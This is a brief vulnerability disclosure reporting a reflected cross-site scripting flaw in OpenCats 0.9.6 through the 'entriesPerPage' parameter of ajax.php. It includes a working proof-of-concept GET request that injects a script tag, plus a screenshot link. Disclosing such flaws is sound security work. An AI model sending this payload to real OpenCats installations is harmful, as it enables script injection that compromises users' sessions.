# Cross Site Scripting vulnerability in the OpenCats 'entriesPerPage'.

OpenCats version 0.9.6 PHP7.2 suffers from reflected XSS vulnerability. 
This allows attackers arbitrary JavaScript injection, which compromises secure session between client and server.

### PoC
```
GET /ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)"></a> <script>alert`xss`</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0
```


![XSS](https://user-images.githubusercontent.com/57464251/192360271-5fd94494-7932-4311-8ae6-836192c0977c.png)
